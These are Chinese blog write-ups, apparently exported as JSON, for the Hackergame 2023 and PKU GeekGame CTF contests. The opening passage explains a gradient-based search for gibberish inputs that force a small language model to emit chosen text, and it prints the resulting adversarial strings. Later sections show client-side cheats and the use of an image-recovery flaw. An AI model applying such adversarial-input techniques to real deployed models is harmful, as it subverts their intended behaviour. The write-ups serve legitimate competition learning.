norm_embedding.t())\n    chosen_idx = torch.argmax(cosine_sim_mat, dim=1)\n    closest_embeddings = embedding_weight[chosen_idx]\n    closest_embeddings = input_embedding + (closest_embeddings - input_embedding).detach()\n    return torch.cat([closest_embeddings[None], target_embedding], dim=1), chosen_idx\n```\n\n这里由于取了个argmax操作，梯度会在传到embedding vector时断开，无法传递到我们需要训练的pseudo embedding vector，于是这里做了一个比较巧妙的操作，即上面代码中的\n\n\n\n```python\nclosest_embeddings = input_embedding + (closest_embeddings - input_embedding).detach()\n```\n\n来自于VQVAE的论文，可见这篇[知乎内容](https://zhuanlan.zhihu.com/p/388299884)，这个操作可以将梯度往前传递，使得待训练的参数可以得到梯度。\n\n\n接下来只要处理一下训练时的输入输出的问题了，对于hackergame，我们首先确定它的token序列：`71, 10735, 6057`\n\n\n然后考虑到transformer的训练机制，我们需要构造一个token序列X，它满足下面的条件：\n\n\nX最后两个token是`71、10735`（即hacker），并且模型在X上输出的logits要向着\n\n\n`[*X[1:], 6057]` （即X去掉第一个token，再接上game的token）去优化。在求出可行的token序列X后，将其前面部分转化为句子（将后面部分即target的前两项去掉），loss收敛以后就得到一个比较可行的解（为什么是比较可行后面再说）。\n\n\n一个可行的解：\n\n{% note success no-pangu simple%}\n\"FE龍喚士 tissue Night coachaxpie viewpoints sharingLt sternedd Tit poured hedge\"\n{% endnote %}\n\n由于三、四题的解题代码几乎是一模一样的，只是改了几个参数，因此到第四题下再贴。\n\n\n### 🐮\n\n\n和第三题差不多，但问题是🐮这个字符被解析成的三个token都是特殊字节，这会导致模型在训练时也会倾向于预测这些特殊字节，然后我发现某些token的存在会影响tokenizer的分词，例如106，它先decode再encode就不是106了，会变成另一个token，还有一些特殊token先decode再encode甚至会出来3个token。这其实就是tokenizer分词器产生的问题，仔细了解一下会发现tokenizer的分词逻辑是按照词频从高到低对句子进行拆分（这里的词频统计是以字节为单位的），而词频文件就是模型文件根目录下的merges.txt。也就是说，如果某个token转成字符串后，能够拆分为其他词频更高的词，就会导致先encode再decode的变换不是恒等变换。\n\n\n（后来发现前面的hackergame也会遇到分词问题，不过运气好第一个跑出来的结果就过了）\n\n\n上面所说的分词的问题也是跑出来的解很多时候并不能通过题目的原因。\n\n\n鉴于跑了好几次最后的结果都包含106这个没法用的特殊token（后来发现其实不止一个），我草率地在前面计算最大余弦相似度的代码里把106列手动调成了-1。结果跑出来一个201字符的解（开头有一个空格）： \n{% note success simple %}\n\"&nbsp;state contemplasm heel desert desert surf的的 investigatesSeven continues Marie their bench Esp sleepy swinging suffer repeated revisit causing porch formula observed ButLater destined negotiations tree\"\n\n{% endnote %}\n\n这个解运气非常好，先encode再decode的结果和原来一样，并且在本地可以输出🐮，但长度超了1，就很难受。\n\n\n黔驴技穷之际，想到会不会上面那个解删掉某个空格后并不影响其分词或对模型预测结果的影响非常小，遂试了几个，最终真的找到了一个解： \n\n{% note success simple %}\n\"&nbsp;state contemplasm heel desert desert surf的的 investigatesSeven continues Marie their bench Esp sleepy swinging suffer repeatedrevisit causing porch formula observed ButLater destined negotiations tree\"\n\n{% endnote %}\n\n![](https://oss.fyz666.xyz/blogfiles/png/95d5e050d38498b32fb84209a5e8366a.png)\n[三、四题的代码](https://gist.github.com/windshadow233/998b9b6a7765c911e77a0de239f99749#file-solve_flag3-py)\n\n\n\n\n---\n\n赛后又改了一个版本的代码（已在上面链接中修改），将token的选择范围限制在了可打印字符集里。\n\n\n用这个版本的代码又成功找到一个长度为195的解： \n\n{% note success simple %}\n\"&nbsp;laboratory Different Barker dripping digits align Socrates surfing SE surf Spanish nights avocado Kenn learns sob vinegar cafe discover goes gentleman lemon follow Jackaffe findipop found p tree\"\n{% endnote %}\n\n\n还有这个以flag开头，甚至包含GPA的长度为153的解： \n\n{% note success simple %}\n\"&nbsp;flag CoveRussiaInteg desert palmYu Sim SE desertxf desert Desert Corey suffering GPA anymore a He finger Sarah HeOur guiding managedBle crawaneerry tree\"\n{% endnote %}\n","tags":["Hackergame","Hackergame 2023"],"categories":["CTF题解"]},{"title":"Hackergame 2023题解（一）","url":"//blog/8779/","content":"\n本文是Hackergame 2023题解的第一部分。\n\n\n\n## Hackergame 启动\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n\n大声喊出 Hackergame 启动，开始今年的冒险！\n\n{% endnote %}\n{% endhideToggle %}\n解法1：直接点击提交，发现URL多出参数`?similarity=`，手动补成`?similarity=114514`再访问即可。\n\n\n~~解法2：多喊几遍Hackergame 启动！让相似度达到100%。~~\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/1771236aeb367d1ed1a5bda668c3502c.png)\nflag{We1ComE-70-hACkEr9aME-4nD-enjoY-h4Ck!nG-z0Z3}\n\n\n\n~~虽然不玩原神，但还是被洗脑了。。。~~\n\n\n## 猫咪小测\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n\n1. 想要借阅世界图书出版公司出版的《A Classical Introduction To Modern Number Theory 2nd ed.》，应当前往中国科学技术大学西区图书馆的哪一层？（30 分）  \n\n    提示：是一个非负整数。\n2. 今年 arXiv 网站的天体物理版块上有人发表了一篇关于「可观测宇宙中的鸡的密度上限」的论文，请问论文中作者计算出的鸡密度函数的上限为 10 的多少次方每立方秒差距？（30 分）  \n\n    提示：是一个非负整数。\n3. 为了支持 TCP BBR 拥塞控制算法，在编译 Linux 内核时应该配置好哪一条内核选项？（20 分）  \n\n    提示：输入格式为 CONFIG_XXXXX，如 CONFIG_SCHED_SMT。\n4. 🥒🥒🥒：「我……从没觉得写类型标注有意思过」。在一篇论文中，作者给出了能够让 Python 的类型检查器 MyPY mypy 陷入死循环的代码，并证明 Python 的类型检查和停机问题一样困难。请问这篇论文发表在今年的哪个学术会议上？（20 分）  \n\n    提示：会议的大写英文简称，比如 ISCA、CCS、ICML。\n\n{% endnote %}\n{% endhideToggle %}\n由于HG的问答题没有提交冷却限制，因此1、2问直接爆破。答案分别为12、23。\n\n\n第三问直接塞入ChatGPT：\n\n\n\n> 为了支持 TCP BBR 拥塞控制算法，在编译 Linux 内核时，您应该配置 CONFIG_TCP_CONG_BBR 选项。\n\n\n一开始搜不到第四题，然后发现相关的会议好像也就那么几个，直接枚举得到ECOOP。\n\n\n🎉🎉🎉flag{wE1COME-TO-4ttEND-th3-NEKO-ex@M-zo23}🎉🎉🎉  \n\n🎉🎉🎉flag{re@l-M4sT3r-oF-thE-nek0-ex4M-IN-ustc}🎉🎉🎉\n\n\n\n## 更深更暗\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n小 E 正在收看电视新闻。\n\n\n「诶，你知道吗，『泰坦』号潜水艇失事了！」小 E 对旁边的小 C 说。\n\n\n小 C 凑近电视机，看了一眼新闻里的画面。\n\n\n「是我眼花了吗？我刚刚有一瞬间好像在残骸上看到了一个 flag？」小 C 惊讶地说。\n\n\n「玩 CTF 玩的。」小 E 对此不以为然，「一定是你看错了。」\n\n\n小 C 却十分相信自己没有看错。\n\n{% endnote %}\n{% endhideToggle %}\n~~好蠢的题~~就喜欢这种题，f12找了一下发现flag直接明文存在html里：\n\n\n\n```HTML\n<pre id=\"titan\">\n                               /\n                               \\\n                               |\n                             __|__\n                            |     \\\n                                    /\n     ____  _________________|___ ___\\__________/ ____\n    &lt;   /                                            \\____________  |\n     /         flag{T1t@n_e2fbeff027cf6d2dbff92fe32594c94b}       \\ (_)\n~~~~~~     O       O       O                                       &gt;=)~~~~~~~\n       \\_______/ ____________\\  /_________________________________/ (_)\n</pre>\n```\n\n## 旅行照片 3.0\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n你的学长去留学了，这一走短时间内怕是回不来了。于是，你在今年暑假来了一场计划已久的旅行，并顺路探望了这位久别的学长。翻阅当天拍下的照片， 种种回忆和感慨油然而生。\n\n\n请观察照片并结合所有文字内容，正确回答题目以获取 flag。\n\n\n🌻 上午  \n\n与学长碰面后，他带你参观了他的学校。在校园的一个展厅内，你发现了一枚神秘的金色奖牌，它闪闪发光，令人心生羡慕。\n\n![](https://cdn.jsdelivr.net/gh/USTC-Hackergame/hackergame2023-writeups/official/%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87%203.0/%E9%A2%98%E7%9B%AE%E7%85%A7%E7%89%87/01.JPG)\n\n\n🌻 中午  \n\n离开校园后，你和学长走到了附近的一家拉面馆用餐。那家店里的拉面香气扑鼻，店内的装饰和氛围也充满了日式的风格。 学长（下图左一）与你分享了不少学校的趣事。饭后，你们决定在附近散步，享受这难得的闲暇时光。当你们走到一座博物馆前时， 马路对面的喷泉和它周围的景色引起了你的注意。下午，白色的帐篷里即将举办一场大型活动，人们忙碌的身影穿梭其中，充满了期待与热情。\n\n![](https://cdn.jsdelivr.net/gh/USTC-Hackergame/hackergame2023-writeups/official/%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87%203.0/%E9%A2%98%E7%9B%AE%E7%85%A7%E7%89%87/02.jpg)\n\n![](https://cdn.jsdelivr.net/gh/USTC-Hackergame/hackergame2023-writeups/official/%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87%203.0/%E9%A2%98%E7%9B%AE%E7%85%A7%E7%89%87/03.jpg)\n\n\n🌻 下午和夜晚  \n\n在参观完博物馆后，学长陪你走到了上野站。你们都感到有些不舍，但知道每次的分别也是为了下次更好的相聚。 学长那天晚上将继续他的学术之旅，打算乘船欣赏东京的迷人夜景和闪耀的彩虹大桥（Rainbow Bridge）。 而你则搭乘了开往马里奥世界的电车，在那里度过了一段欢乐的时光。\n\n![](https://cdn.jsdelivr.net/gh/USTC-Hackergame/hackergame2023-writeups/official/%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87%203.0/%E9%A2%98%E7%9B%AE%E7%85%A7%E7%89%87/04.jpg)\n\n\n\n1. **你还记得与学长见面这天是哪一天吗？（格式：yyyy-mm-dd）**\n2. **在学校该展厅展示的所有同种金色奖牌的得主中，出生最晚者获奖时所在的研究所缩写是什么？**\n3. **帐篷中活动招募志愿者时用于收集报名信息的在线问卷的编号（以字母 S 开头后接数字）是多少？**\n4. **学长购买自己的博物馆门票时，花费了多少日元？**\n5. **学长当天晚上需要在哪栋标志性建筑物的附近集合呢？（请用简体中文回答，四个汉字）**\n6. **进站时，你在 JR 上野站中央检票口外看到「ボタン＆カフリンクス」活动正在销售动物周边商品，该活动张贴的粉色背景海报上是什么动物（记作 A，两个汉字）？ 在出站处附近建筑的屋顶广告牌上，每小时都会顽皮出现的那只 3D 动物是什么品种？（记作 B，三个汉字）？（格式：A-B）**\n\n{% endnote %}\n{% endhideToggle %}\n非常喜欢这种开盒题，虽然今年有2问卡了好久，但最终是盒出来了。\n\n\n先把照片全下到本地，看看有没有留下与日期等相关的exif，发现没有。然后注意到与第三个图相关的文案：“下午，白色的帐篷里即将举办一场大型活动”，于是把图片拿到Google Lens看了一下，发现这个广场是“上野恩赐公园”的“喷泉广场”。并且我们知道拍摄日期是今年的暑假，于是查了一下上野公园在2023年8月有什么活动的信息，搜到[一个链接](https://tw.wamazing.com/media/article/a-3054/)，发现这个活动是2023年日本全國梅酒祭\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/a24b9572a9b23fe0ec3fd839ecf40e93.png)\n那么拍摄日期应该就是8月10日。\n\n\n第二问卡了好久，原因是理解错了句意，一开始理解成了“所有获得过诺贝尔物理学奖的人中，出生最晚的”，然后搜到一位74年出生的俄罗斯籍的小哥：[Konstantin Novoselov](https://en.wikipedia.org/wiki/Konstantin_Novoselov)，是University of Manchester的教授，然而把他所任职过的各种机构、各种缩写方式、各种可能的大小写组合挨个试了一遍没一个对的。\n\n\n后来我猛的意识到“**在学校该展厅展示的**”这几个字，那么问题应该是“这个学校出过的诺贝尔物理学奖得主中最晚出生的”，注意到图1的奖牌写着M. KOSHIBA，是小柴昌俊，于是得到学校是东京大学。再搜东京大学出过的诺贝尔物理学奖得主，发现最年轻的是[梶田隆章](https://zh.wikipedia.org/zh-hans/%E6%A2%B6%E7%94%B0%E9%9A%86%E7%AB%A0)，这个维基页面还介绍了他从2008年开始，就在东京大学[宇宙射线研究所](https://en.wikipedia.org/wiki/Institute_for_Cosmic_Ray_Research)进行研究工作，该研究所缩写为**ICRR**，即得答案。\n\n\n第三问就简单了，既然已经知道是日本全國梅酒祭，直接找到它的官网，在官网里找到了这次活动的志愿者[报名信息](https://umeshu-matsuri.jp/tokyo_staff/)，里面即有[报名链接](https://ws.formzu.net/dist/S495584522/):\n\n{% note info simple %}\n`https://ws.formzu.net/dist/S495584522/`\n{% endnote %}\n\n第四问瞎蒙一个0，结果对了。\n\n\n第五问不会，在解决了第六问后枚举了好多附近的四字建筑都不对。最后猜测因为学长要去“学术之旅”，那么可能就是去东京大学的某个教学楼之类的地方吧，然后搜到一个“安田讲堂”，试了一下对了。\n\n\n第六问先谷歌搜关键字**ボタン&カフリンクス jr上野**，直接出来一张粉色的海报，上面画着熊猫（其实二字动物一猜就是熊猫根本不用搜）\n\n\n接下来需要知道出站口在哪里，搜了一下最后一幅图，发现是位于渋谷的任天堂旗舰店，然后去地图里导了个航看看从上野站到任天堂旗舰店的路线，得到目的站点为渋谷站，在Google map查看该站附近的全景地图，确实发现了一个广告牌：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/1706dead9d430bdc55fcfb9e8c69f301.png)\n然而这张全景图拍的不是时候，广告牌上找不到动物。然后只好搜了一下“渋谷 广告牌 3d”等关键字，搜到[链接](https://wow-japan.com/news-flash-shibuya-3d-akida-dog-ads/)，因此答案为秋田犬。\n\n\n## 赛博井字棋\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n\n那一年的人机大战，是 AlphaGo 对阵柯洁，最终比分 3-0。当时我看见柯洁颓坐在椅子上泣不成声，这个画面我永生难忘。那一刻我在想，如果我能成为一名棋手，我一定要赢下人工智能。如今 AI 就在眼前，我必须考虑这会不会是我此生仅有的机会。重铸人类围棋荣光，我辈义不容辞！\n\n\n……\n\n\n但是围棋实在太难了，你决定先从井字棋开始练习。\n\n{% endnote %}\n{% endhideToggle %}\n井字棋正常玩的话，只要对方不是傻子，即使是先手也最多只能平局。考虑到这是个web题，故从其他角度考虑。\n\n\n试了一下发现只要在f12的console界面依次执行两个setMove：`setMove(0,0);setMove(0,1);`然后点一下坐标（0,2）位置，即可赢下游戏：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/9210118b0501c83ecb61fbad4f69658f.png)\n## 奶奶的睡前 flag 故事\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n\n> 包含 AI 辅助创作\n\n\n（以下内容由 GPT 辅助编写，如有雷同纯属巧合）\n\n\n晴空万里的假期终于拍了拍翅膀飞来了。对于一心想扔掉教材、砸掉闹钟、跃向世界的 L 同学来说，期待了整整三年的跨国旅游大业终于是时候启动了，还能巧妙地顺带着做个美满的老友记。\n\n\n可是，哎哟喂，他刚踩上波光粼粼的金沙海滩，那他最疼爱的华为手机就跟着海风一起去约会了大海，连他的钱包也在这场未知探索之旅中神秘失踪。\n\n\n「这个地方怎么连个华为手机都不卖。若是买个苹果手机，心疼的是它连个实体 SIM 卡槽都藏起来了，回国肯定成了个大摆设。不如来个**谷歌的『亲儿子』**？」L 同学踌躇满志地嘀咕道。\n\n\n那时，像是上天的安排，「咱这儿正好有个**谷歌『亲儿子』**的老手机，你拿去逍遥吧」。\n\n\nL 同学满眼星光地接过，**连系统都没心思升级**，就开始疯狂安装那个久闻大名的 GPT 程序，甚至雀跃地在群里晒出一张跟 GPT 对话的精彩**截图**，一时间成为了群里的焦点人物。\n\n\n![](https://cdn.jsdelivr.net/gh/USTC-Hackergame/hackergame2023-writeups/official/%E5%A5%B6%E5%A5%B6%E7%9A%84%E7%9D%A1%E5%89%8D%20flag%20%E6%95%85%E4%BA%8B/files/screenshot.png)\n\n\n{% endnote %}\n{% endhideToggle %}\n题面给的信息是相当的多，但反正我是看不见的。\n\n\n一开始拿到这题，感觉是png的高度被改小了，遂打开16进制编辑器一通改，结果发现没用。\n\n\n然后用pngcheck等工具检查，发现有两个IEND块，在第一个IEND块后面还多了一大截数据，其中都是png的IDAT块结构，故将后面一半多出来的数据dd出来研究，然而捣鼓了大半天也没能把后面的数据拼出一个能看到东西的png。最后看着解出这题的人越来越多，我感到很纳闷，觉得一定是有信息漏看了，于是重新审视题面文字，才发现有加粗的文本。\n\n\n有了这些信息，我就去搜了一下“谷歌手机 截图 漏洞”等关键词，搜到了一个[网页](https://0xzx.com/zh-tw/2023032102243286738.html)，里面提到谷歌手机截图编辑可被恢复的漏洞：Acropalypse，甚至还良心提供一个利用该漏洞的网站：[acropalypse.app](https://acropalypse.app)，进去以后选了个低版本的系统，将图片发上去即可恢复出被截掉的部分：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/5442f886e33bbf0ccaed647725eb520b.png)\n直呼卧槽！原来是送分题。\n\n\n## 组委会模拟器\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n\n每年比赛，组委会的一项重要工作就是时刻盯着群，并且撤回其中有 flag 的消息。今年因为人手紧张，组委会的某名同学将这项工作外包给了你，你需要连续审查 1000 条消息，准确无误地撤回其中所有含 flag 的消息，并且不撤回任何不含 flag 的消息。\n\n\n本题中，你需要撤回的 \"flag\" 的格式为 hack[...]，其中方括号内均为小写英文字母，点击消息即可撤回。你需要在 3 秒内撤回消息，否则撤回操作将失败。在全部消息显示完成后等待几秒，如果你撤回的消息完全正确（撤回了全部需要撤回的消息，并且未将不需要撤回的消息撤回），就能获得本题真正的 flag。\n\n{% endnote %}\n{% endhideToggle %}\n题面很实诚，直接告诉我们要干什么事，也确实只要按它说的做就行了。\n\n\n不过我看了一下发现有1000条消息在100多秒内闪完，手点好像不够快，于是写了个[脚本](https://gist.github.com/windshadow233/6b563b0380e7344a55dfad22fd5c9514)来发包撤回消息，在网络畅通的情况下，跑完脚本就能获取flag。\n\n## 虫\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n\n「生而为人，应该能够换尿布、策划入侵、杀猪、开船、造房子、写十四行诗、算账、建墙、正骨、抚慰临终之人、接受命令、下达命令、合作、独行、解决方程式、分析新问题、清理马粪、编程、烹饪美食、高效战斗、英勇牺牲。专业分工是给昆虫准备的。」—罗伯特·海莱恩（Robert Heinlein）\n\n\n你觉得还是当昆虫轻松一些。\n\n\n这时，你看到一只昆虫落在你面前，发出奇怪的叫声。你把这段声音录制了下来：这听起来像是一种**通过无线信道传输图片的方式**，如果精通此道，或许就可以接收来自国际空间站（ISS）的图片了。\n\n\n\n[本题附件](https://github.com/USTC-Hackergame/hackergame2023-writeups/raw/master/official/%E8%99%AB/files/insect.wav)\n\n{% endnote %}\n{% endhideToggle %}\n音频题没什么思路，于是搜了一下题目里说的“通过无线信道传图片 国际空间站 ISS”等信息，搜到一个叫[SSTV](https://en.wikipedia.org/wiki/Slow-scan_television)的东西，然后顺理成章搜到解码工具[RX-SSTV](https://www.qsl.net/on6mu/rxsstv.htm)，下载一下用来解码。\n\n\n不过如果直接外放音频的话，噪声太多了，只能看到非常糊的flag字样，然后了解到可以通过虚拟声卡来解决这个问题，这个RX-SSTV也支持从虚拟声卡读取数据。\n\n\n之后只需要耐心等flag图片被解码出来：\n\n![](https://oss.fyz666.xyz/blogfiles/webp/2413fa7edb1c10dd5f081f8785db7422.webp)\n","tags":["Hackergame","Hackergame 2023"],"categories":["CTF题解"]},{"title":"Hackergame 2023题解（零）","url":"//blog/8773/","content":"\n又是一届快乐的Hackergame，今年神仙附体，拿到校内rank2，总排名rank13，是自19年开始玩Hackergame以来的最好成绩，可喜可贺可喜可贺！\n\n![](https://oss.fyz666.xyz/blogfiles/png/c1f7656aba1a3990d80eaf1ea3c4ac40.png)\n\n{% link 本次比赛的官方存档,GitHub,https://github.com/USTC-Hackergame/hackergame2023-writeups %}\n\n\n## 题解\n\n\n下面是本次比赛解出题目的题解：\n\n\n- [Hackergame 2023题解（一）](/blog/8779/)  \n\nHackergame 启动、猫咪小测、更深更暗、旅行照片 3.0、赛博井字棋、奶奶的睡前 flag 故事、组委会模拟器、虫\n- [Hackergame 2023题解（二）](/blog/8782/)  \n\nJSON ⊂ YAML?、Git? Git!、HTTP 集邮册、Docker for Everyone、惜字如金 2.0、🪐 高频率星球、🪐 小型大语言模型星球\n- [Hackergame 2023题解（三）](/blog/8784/)  \n\n🪐 流式星球、🪐 低带宽星球（小试牛刀）、Komm, süsser Flagge、为什么要打开 /flag 😡（LD_PRELOAD, love!）、异星歧途、O(1) 用户登录系统、小 Z 的谜题\n\n## 总结\n\n\n今年的题目难度两极分化严重，有些题目一眼送分（至少对我个人而言，已经可以把🪐 流式星球以及之前的所有题全做完了，而且打上了6000分，这在前面几届的比赛里是不敢想的，另外从4000分上不了前100也可以看出），而有些难题也仍是做不了一点。不过这样的难度分布既能让萌新的游戏体验更好，也能让大佬不觉得无聊（大概）。\n\n\n除了校内二等奖之外，本次比赛中我还收获了以前几届比赛里未曾染指的奖，即一个一血奖和两个分类奖（General和AI），AI分类奖得益于很多信安出身的选手可能没接触过神经网络或者Transformer模型，而General分类奖则有ChatGPT一半功劳。\n\n\n相比于以往几届比赛，今年的题目多了一个新的分类：AI，在大模型满天飞的时代背景下可以说是很与时俱进了，虽然只有一道题，但非常有意思。因为我本人恰好就是人工智能领域的在读博士生，也算是有一些相关经验（这个AI题的思路秒出，更多的解题时间是在写代码解决技术上的问题以及调参）。另外靠着这一个题同时拿到了一血奖和AI分类奖，体验不错，建议下次还出！\n\n\nMath和Binary仍是吊车尾水平，下次继续加油！\n","tags":["Hackergame","Hackergame 2023"],"categories":["CTF题解"]},{"title":"PKU GeekGame 3rd题解（二）","url":"//blog/8527/","content":"\n本文是本次PKU GeekGame题解的第二部分。\n\n\n\n## 简单的打字稿\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n\n> 尊敬的用户,您好!\n> \n> \n> 我们深刻认识到,大力推广使用TypeScript这门优秀的编程语言,将对我国社会主义现代化建设产生深远的正面影响。我们梳理了TypeScript与现代化建设的结合点,并进行了详细阐述,请您评价。\n> \n> \n> ...\n> \n> \n> 我们呼吁北大等高校里富有社会责任感的青年学子,在学习TypeScript技能的同时,将之用于服务国家发展大局。让我们继续在信息技术进步的道路上阔步前行,以TypeScript为工具,建设一个我们夢想中的社会主义现代化强国,以人民为中心,实现中华民族伟大复兴!\n\n\n显然，题面要是让 Claude 生成，就会变成上面那个鬼样。\n\n\n不过前人说，TypeScript 确实很安全，至少对于类型来说更是如此。那么若我把 Flag 放在类型里，阁下又将如何应对？\n\n\n```typescript\ntype flag1 = 'flag{...}'\ntype flag2 = object | { new (): { v: () => (a: (a: unknown, b: { 'flag{...}': never } & Record<string, string>) => never) => unknown } }\n\n// your code here\n```\n\n[本题附件](https://github.com/PKU-GeekGame/geekgame-3rd/raw/master/official_writeup/prob13-easyts/attachment/prob13-src.tar.gz)\n\n{% endnote %}\n{% endhideToggle %}\n### Super Easy\n\n\n这题第二阶段的提示讲道理根本没用，我知道要让它产生类型报错来输出内容，我也知道要想办法让内容不输出flag，问题是“how”？\n\n\n由于我根本没用过TypeScript，我就问了一下ChatGPT，结果居然套出来第一题的答案，（经过我的修改以后）如下所示：\n\n\n\n```typescript\ntype F1agContent = flag1 extends `flag{${infer Rest}}` ? Rest : never;\nconst giveMeF1ag: F1agContent = 'f1ag';\n```\n\n然后理解了一下，大概是用了TypeScript的类型推断特性，用infer关键字来匹配出flag1这个type花括号里的字符串，然后将该字符串作为新的一个类型。接下来用该类型定义一个变量，随便赋个不包含字符串“flag”的值就好了。\n\n\nflag{TOo0_e4sy_F1aG_foR_Tooo_EaSy_laNg}\n\n\n\n第二题就不会了，感觉问题的关键在于如何处理`Record<string, string>`\n\n\n不过这题的flag1分值居然高于flag2，乐！\n\n\n## 汉化绿色版免费下载\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n\n 欢迎访问兆大ＣＴＦ：\n\n\n 精彩的Flag等着你来拿！！\n\n\n ╭═══════════════╮  \n\n ║ 兆 大 Ｃ Ｔ Ｆ ║  \n\n ╭══════┤ geekgame.pku.edu.cn ├══════╮  \n\n ║ ║ 世 纪 下 载 ║ ║  \n\n ║ ╰═══════════════╯ ║  \n\n ║ ║  \n\n ║声明： ║  \n\n ║ 1) 本站不保证所提供软件或程序的完整性和安全性。 ║  \n\n ║ 2) 请在使用前查毒。 ║  \n\n ║ 4) 转载本站提供的资源请勿删除本说明文件。 ║  \n\n ║ 5) 本站提供的程序均为网上搜集，如果该程序涉及或侵害到您║  \n\n ║ 的版权请立即写信通知我们。 ║  \n\n ║ 6) 本站提供软件只可供研究使用，请在下载24小时内删除, ║  \n\n ║ 切勿用于商业用途，由此引起一切后果与本站无关。 ║  \n\n ║ ║  \n\n ║ ║  \n\n ║ 1. 推荐使用：WinRAR V3.2以上版本解压本站软件 ║  \n\n ║ 2. 本站承接CTF，虚拟皮套，网站制作，等业务 ║  \n\n ║ ║  \n\n ║ 兆大ＣＴＦ: https://geekgame.pku.edu.cn ║  \n\n ║ ║  \n\n ║ 奖品领取;网站合作 Email: geekgame at pku.edu.cn ║  \n\n ║ ║  \n\n ║ ║  \n\n ║ ╭───────────────────────╮ ║  \n\n ╰══┤ 兆大ＣＴＦ https://geekgame.pku.edu.cn ├══╯  \n\n ╰───────────────────────╯\n\n\n如果你觉得我们网站能给你带来方便，请把 https://geekgame.pku.edu.cn 网站介绍给你的朋友！！！\n\n\n补充说明：\n\n\n如程序描述，Flag 2 是 “出题人在存档里输入的内容”，并非所有能通过程序判定的 Flag 都是对的。Flag 2 可以唯一解出，如果发现多解说明你漏掉了一些信息。\n\n\n\n[最新最热汉化绿色版题目附件！](https://github.com/PKU-GeekGame/geekgame-3rd/raw/master/official_writeup/prob25-krkr/attachment/prob25.zip)\n\n{% endnote %}\n{% endhideToggle %}\n### 普通下载\n\n\n打开程序，简单玩了一下。发现\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/e8b722581fa8e5d5921146efebd0e70c.png)\n嗯？？？\n\n\nCE，启动！flag，搜索！\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/5101424398ea0ace1e031c2ade2ffba1.png)\nflag{did-you-unpack-the-xp3?}\n\n\n\n嗯？xp3？这是什么东西？？\n\n\n### 高速下载\n\n\n注意到前面CE里搜到了不止一处flag，一条一条看看能不能搜到第二题的flag（x\n\n\n显然搜不到flag2，但：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/7103cfe7e4da98bcded80d70500a522a.png)\n好像有什么神奇的东西写在内存里，我们把长度改大一点看看：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/ab2695ff638d429cefbc576b4a39900b.png)\n嗯？19260817？~~好暴力的数字~~\n\n\n虽然不知道这是什么神奇的编程语言，但很容易看懂。原来每按一个字母，程序就会用一种方法来更新hash值。不过这段程序没有告诉我们初始的hash值是多少。或许得从其他地方找找。\n\n\n显然我们还有东西没有用，那就是出题人的存档。出题人的存档保存在savedata文件夹下，共有3个文件，其中一个kdt文件，两个ksd文件，并不知道是什么格式。搜了一下发现有一个脚本可以解包这种文件：[KirikiriDescrambler](https://github.com/arcusmaximus/KirikiriTools)。\n\n\n将这三个文件分别解包，然后一一仔细阅读，发现在data0.kdt这个文件的最后，出现了一些看上去有用的东西：\n\n\n\n```plaintext\n\"user\" => %[\n  \"hash\" => int 1337,\n  \"text\" => string \"flag{\",\n  \"prev_hash\" => int 7748521\n ],\n```\n\n我合理猜测hash字段表示初始的hash值，prev_hash表示经过出题人一些操作后的hash值。然后我打开游戏随便按了几下并存了个档，验证了一下发现确实是这么回事。那么这题就是求一个AEIOU的序列（并且以\"}\"结尾），让1337经过前面的这种hash计算最终得到7748521。\n\n\n一开始我以为就是一个解线性方程的问题，然后确实也跑出来了一个解: OEIUIOAAAU，不过提交上去却发现不对。。。那根据题目说明，应该是漏掉什么关键信息了。\n\n\n不过我们还有另外两个文件没看：datasc.ksd和datasu.ksd，看了下datasc.ksd，好像没什么有用的信息，不过另一个文件就有一些东西了：\n\n\n\n```plaintext\n%[\n \"trail_round1_sel_i\" => int 1,\n \"autotrail_func_init\" => int 1,\n \"trail_func_init\" => int 1,\n \"autotrail_first_start\" => int 1,\n \"autotrail_round1_sel_i\" => int 1,\n \"trail_round1_round_1\" => int 1,\n \"trail_autolabel_autoLabelLabel\" => int 18,\n \"autotrail_round1_sel_end\" => int 2,\n \"trail_round1_sel_fin\" => int 1,\n \"autotrail_autolabel_autoLabelLabel\" => int 2,\n \"trail_round1_sel_a\" => int 6,\n \"autotrail_round1_sel_e\" => int 1,\n \"trail_first_start\" => int 1,\n \"trail_round1_sel_loop\" => int 18,\n \"autotrail_round1_sel_a\" => int 1,\n \"autotrail_round1_sel_o\" => int 1,\n \"trail_round1_sel_end\" => int 17,\n \"autotrail_round1_sel_loop\" => int 1,\n \"autotrail_round1_sel_fin\" => int 1,\n \"trail_round1_sel_e\" => int 3,\n \"autotrail_round2_round_2\" => int 1,\n \"trail_round1_sel_o\" => int 6,\n \"autotrail_round1_round_1\" => int 2\n]\n```\n\n可以看到文件里有很多长这样的字段：trail_round1_sel_x，并且都对应了某个整数，sel_x容易猜测是选择x的意思，那么这个文件是否记录了出题人选择每个字母的次数呢？于是我又打开游戏自己玩了一遍并存档，发现果然如是。\n\n\n那么我们可以得出序列一定是由\"AAAAAAEEEIOOOOOO\"这些字母排列而成的，而这种序列只有$\\frac{16!}{3!\\times 6! \\times 6!}=6726720$种，好像枚举一下也是可接受的。因此可以写个脚本来枚举：\n\n\n\n```python\nimport tqdm\nfrom collections import Counter\n\n\ndef hash_code(s):\n    hash = 1337\n    for char in s:\n        hash = (13337 * hash + [11, 22, 33, 44, 55]['AEIOU'.index(char)])\n    hash = hash * 13337 + 66\n    return hash % 